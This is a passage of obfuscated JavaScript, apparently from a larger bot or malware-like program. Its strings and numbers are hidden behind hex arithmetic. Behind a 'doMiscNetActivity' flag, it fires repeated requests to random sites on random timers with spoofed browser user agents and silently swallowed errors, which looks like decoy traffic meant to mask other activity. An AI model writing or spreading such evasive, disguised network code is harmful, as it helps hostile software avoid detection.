      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = -0x1cfb + -0x373 * -0x2 + -0x1615 * -0x1; k < 0x3 * -0x290 + -0x1e0f + 0x25c3; k++)
    setTimeout(f, (-0xc307 + 0x11f3a + 0x8e2d) * k * getRandomInt(0x2327 * 0x1 + -0x10ab + -0x127b, -0x7dd * 0x2 + -0x31f + 0x12dc));
  setInterval(() => {
    f();
    for (let l = 0x15 * -0x189 + 0xaf1 + 0x553 * 0x4; l < 0x19f2 + 0x20bf + 0x9 * -0x685; l++)
      setTimeout(f, (-0xbf07 * 0x1 + 0x5dd * -0x33 + 0x2d46e) * l * getRandomInt(-0x20a3 + 0x2 * -0x134a + 0xd4 * 0x56, 0x398 * 0x4 + -0x1271 + 0x414));
  }, -0x53dfbb + -0x2c332c + 0x65 * 0x1cfdb);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (0x1445 * 0x1 + 0x1 * -0x52f + 0xc42) * getRandomInt(0x1d85 + -0x433 + -0x1951, -0x1589 + -0x18a7 + 0xf67 * 0x3));
}, 0x1 * -0xd5d + -0x568 + 0x1329);